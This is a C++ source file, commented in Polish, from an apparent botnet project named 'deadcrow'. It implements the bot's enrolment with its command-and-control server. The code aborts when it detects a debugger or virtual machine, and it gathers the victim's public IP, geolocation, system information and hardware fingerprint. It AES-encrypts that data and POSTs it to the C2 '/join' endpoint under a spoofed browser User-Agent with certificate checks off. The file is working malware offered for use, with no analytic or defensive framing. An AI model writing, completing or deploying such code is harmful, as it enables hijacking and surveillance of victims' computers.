#include "join.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <sstream>
#include <random>

using json = nlohmann::json;

namespace deadcrow {
namespace botnet {

// Callback dla libcurl do zapisywania danych
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    std::string* response = static_cast<std::string*>(userp);
    response->append(static_cast<char*>(contents), realsize);
    return realsize;
}

Join::Join(const std::string& c2_url, const std::string& aes_key)
    : c2_url_(c2_url), aes_key_(aes_key) {
    
    // Inicjalizacja libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[JOIN] " << status << std::endl;
        #endif
    };
}

bool Join::joinBotnet() {
    reportStatus("Dołączanie do botnetu");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (utils::AntiDebug::performAllChecks()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Pobierz publiczne IP
    std::string ip = getPublicIp();
    if (ip.empty()) {
        reportStatus("Nie udało się pobrać publicznego IP");
        return false;
    }
    
    // Pobierz geolokalizację
    if (!fetchGeoLocation(ip)) {
        reportStatus("Nie udało się pobrać geolokalizacji");
        // Kontynuuj mimo to
    }
    
    // Przygotuj dane do wysłania
    json data;
    data["bot_id"] = bot_id_.getBotId();
    data["system_info"] = bot_id_.getSystemInfo();
    data["hardware_fingerprint"] = bot_id_.getHardwareFingerprint();
    data["ip"] = ip;
    data["geo"] = geo_location_;
    data["timestamp"] = std::chrono::system_clock::now().time_since_epoch().count();
    
    // Dodaj losowy identyfikator żądania, aby uniknąć cachowania
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 1000000);
    data["request_id"] = dis(gen);
    
    // Szyfruj dane
    utils::AES aes(aes_key_);
    std::string encrypted_data = aes.encryptToBase64(data.dump());
    
    // Przygotuj URL
    std::string url = c2_url_;
    if (url.back() != '/') {
        url += '/';
    }
    url += "join";
    
    // Inicjalizuj sesję CURL
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return false;
    }
    
    // Przygotuj odpowiedź
    std::string response;
    
    // Przygotuj nagłówki
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    
    // Przygotuj dane POST
    json post_data;
    post_data["data"] = encrypted_data;
    std::string post_fields = post_data.dump();
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    
    // Zwolnij zasoby
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas wysyłania żądania: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    // Parsuj odpowiedź
    try {
        // Deszyfruj odpowiedź
        json response_json = json::parse(response);
        
        // Sprawdź, czy odpowiedź zawiera zaszyfrowane dane
        if (!response_json.contains("data")) {
            reportStatus("Odpowiedź nie zawiera danych");
            return false;
        }
        
        // Deszyfruj dane
        std::string encrypted_response = response_json["data"];
        std::string decrypted_response = aes.decryptFromBase64(encrypted_response);
        
        // Parsuj odszyfrowane dane
        json result = json::parse(decrypted_response);
        
        // Sprawdź status
        if (result.contains("status") && result["status"] == "success") {
            reportStatus("Dołączono do botnetu pomyślnie");
            
            // Jeśli mamy obiekt beacon, ustaw dane bota
            if (beacon_) {
                beacon_->setBotInfo(bot_id_.getBotId(), bot_id_.getSystemInfo());
            }
            
            return true;
        } else {
            reportStatus("Błąd podczas dołączania do botnetu: " + result.value("message", "Nieznany błąd"));
            return false;
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas parsowania odpowiedzi: " + std::string(e.what()));
        return false;
    }
}

std::string Join::getPublicIp() {
    reportStatus("Pobieranie publicznego IP");
    
    // Inicjalizuj sesję CURL
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return "";
    }
    
    // Przygotuj odpowiedź
    std::string response;
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    
    // Zwolnij zasoby
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas pobierania IP: " + std::string(curl_easy_strerror(res)));
        return "";
    }
    
    reportStatus("Pobrano publiczne IP: " + response);
    return response;
}

bool Join::fetchGeoLocation(const std::string& ip) {
    reportStatus("Pobieranie geolokalizacji dla IP: " + ip);
    
    // Inicjalizuj sesję CURL
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return false;
    }
    
    // Przygotuj odpowiedź
    std::string response;
    
    // Przygotuj URL
    std::string url = "http://ip-api.com/json/" + ip;
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    
    // Zwolnij zasoby
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas pobierania geolokalizacji: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    // Parsuj odpowiedź
    try {
        json geo_json = json::parse(response);
        
        if (geo_json.contains("status") && geo_json["status"] == "success") {
            std::stringstream ss;
            ss << geo_json.value("country", "Unknown") << ", "
               << geo_json.value("regionName", "Unknown") << ", "
               << geo_json.value("city", "Unknown");
            
            geo_location_ = ss.str();
            reportStatus("Pobrano geolokalizację: " + geo_location_);
            return true;
        } else {
            reportStatus("Błąd podczas pobierania geolokalizacji: " + geo_json.value("message", "Nieznany błąd"));
            return false;
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas parsowania geolokalizacji: " + std::string(e.what()));
        return false;
    }
}

void Join::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Join::setBeacon(std::shared_ptr<core::Beacon> beacon) {
    beacon_ = beacon;
}

std::string Join::getBotId() const {
    return bot_id_.getBotId();
}

std::string Join::getSystemInfo() const {
    return bot_id_.getSystemInfo();
}

std::string Join::getHardwareFingerprint() const {
    return bot_id_.getHardwareFingerprint();
}

std::string Join::getGeoLocation() {
    return geo_location_;
}

void Join::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

} // namespace botnet
} // namespace deadcrow
